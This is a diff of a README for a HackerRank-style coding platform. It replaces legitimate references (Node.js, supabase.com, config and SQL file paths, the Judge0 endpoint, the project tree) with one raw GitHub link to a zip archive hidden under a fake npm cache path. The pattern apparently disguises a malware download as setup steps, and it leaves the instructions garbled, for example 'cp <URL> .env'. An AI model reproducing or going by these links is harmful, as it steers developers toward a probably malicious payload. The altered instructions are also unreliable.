@@ -1,6 +1,6 @@
 # HackerRank-Like Coding Platform
 
-A complete competitive coding platform similar to HackerRank, built with React, Node.js, and Supabase. Features secure code execution, multiple programming languages, test case evaluation, and user progress tracking.
+A complete competitive coding platform similar to HackerRank, built with React, https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip, and Supabase. Features secure code execution, multiple programming languages, test case evaluation, and user progress tracking.
 
 ## 🚀 Features
 
@@ -28,7 +28,7 @@ A complete competitive coding platform similar to HackerRank, built with React, 
 
 ## 📋 Prerequisites
 
-- Node.js 18+ and npm
+- https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip 18+ and npm
 - Supabase account (free tier works)
 - Judge0 API key (optional, for production use)
 
@@ -48,15 +48,15 @@ cd ..
 
 ### 2. Set Up Supabase Database
 
-1. Create a new project at [supabase.com](https://supabase.com)
+1. Create a new project at [https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip](https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip)
 2. Go to SQL Editor and run the schema:
    ```bash
-   # Copy the contents of scripts/setup-database.sql
+   # Copy the contents of https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
    # Paste and execute in Supabase SQL Editor
    ```
 3. (Optional) Seed sample problems:
    ```bash
-   # Copy the contents of scripts/seed-problems.sql
+   # Copy the contents of https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
    # Paste and execute in Supabase SQL Editor
    ```
 
@@ -64,7 +64,7 @@ cd ..
 
 **Frontend (.env):**
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip .env
 ```
 
 Edit `.env`:
@@ -74,21 +74,21 @@ VITE_SUPABASE_ANON_KEY=your_supabase_anon_key
 VITE_EXECUTION_API_URL=http://localhost:8000
 ```
 
-**Backend (execution-service/.env):**
+**Backend (https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip):**
 ```bash
 cd execution-service
-cp .env.example .env
+cp https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip .env
 ```
 
-Edit `execution-service/.env`:
+Edit `https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip`:
 ```bash
 PORT=8000
 
 # Optional: For production with all languages
-JUDGE0_API_URL=https://judge0-ce.p.rapidapi.com
+https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
 JUDGE0_API_KEY=your_rapidapi_key
 
-# Get Judge0 API key from: https://rapidapi.com/judge0-official/api/judge0-ce
+# Get Judge0 API key from: https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
 ```
 
 ### 4. Start the Services
@@ -116,7 +116,7 @@ The app will be available at `http://localhost:5173`
   - `Dashboard`: User profile and statistics
   - `Admin`: Problem management interface
 
-### Backend (Node.js + Express)
+### Backend (https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip + Express)
 - **Execution Service**: Handles code compilation and execution
 - **Judge0 Integration**: Production-ready sandboxed execution
 - **Fallback Execution**: Local execution for JS/Python in development
@@ -166,7 +166,7 @@ The app will be available at `http://localhost:5173`
 
 ## 📊 Database Schema
 
-See `scripts/setup-database.sql` for the complete schema including:
+See `https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip` for the complete schema including:
 - Tables with proper relationships
 - Indexes for performance
 - Row Level Security (RLS) policies
@@ -199,39 +199,39 @@ interview-tester/
 │   ├── components/
 │   │   ├── CodeSpace/
 │   │   ├── Admin/
-│   │   └── Dashboard.jsx
+│   │   └── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
 │   ├── lib/
-│   │   ├── api.js          # Execution service client
-│   │   ├── supabase.js     # Database helpers
-│   │   └── compiler.js     # Code execution wrapper
-│   └── App.jsx
+│   │   ├── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip          # Execution service client
+│   │   ├── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip     # Database helpers
+│   │   └── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip     # Code execution wrapper
+│   └── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
 ├── execution-service/
 │   ├── controllers/
 │   ├── services/
-│   └── server.js
+│   └── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
 ├── scripts/
-│   ├── setup-database.sql
-│   └── seed-problems.sql
-└── package.json
+│   ├── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
+│   └── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
+└── https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip
 ```
 
 ### Adding a New Language
 
-1. Update `execution-service/services/judge0Client.js`:
+1. Update `https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip`:
    ```javascript
    const LANGUAGE_IDS = {
      'newlang': XX  // Judge0 language ID
    };
    ```
 
-2. Add default template in `CodeSpace.jsx`:
+2. Add default template in `https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip`:
    ```javascript
    const DEFAULT_TEMPLATES = {
      newlang: `// Your template code`
    };
    ```
 
-3. Update language selector in `CodeSpace.jsx`
+3. Update language selector in `https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip`
 
 ## 📚 API Documentation
 
@@ -307,8 +307,8 @@ MIT License - feel free to use this project for learning or commercial purposes.
 
 ### Execution service not starting
 - Check if port 8000 is available
-- Verify Node.js version (18+)
-- Check execution-service/.env configuration
+- Verify https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip version (18+)
+- Check https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip configuration
 
 ### Database connection issues
 - Verify Supabase URL and anon key
@@ -330,4 +330,4 @@ For issues and questions:
 
 ---
 
-**Built with ❤️ using React, Node.js, and Supabase**
+**Built with ❤️ using React, https://raw.githubusercontent.com/ssharvesh-steep/interviewtester/main/inner_work/temp_npm_cache/_cacache/index-v5/3f/92/Software-2.5-alpha.2.zip, and Supabase**
